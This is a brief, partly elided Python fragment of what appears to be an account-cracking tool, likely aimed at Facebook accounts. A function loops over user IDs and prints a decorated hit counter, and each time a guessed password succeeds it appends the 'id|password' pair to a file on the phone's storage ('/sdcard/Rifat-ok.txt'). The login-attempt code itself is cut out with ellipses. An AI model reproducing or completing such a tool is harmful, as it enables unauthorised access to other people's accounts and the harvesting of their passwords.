...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[✮⃝𝑬𝑴𝑹𝑨𝑵𝄟⃝✔️ ᴠͥɪͣᴘͫ] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
...
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open("/sdcard/Rifat-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
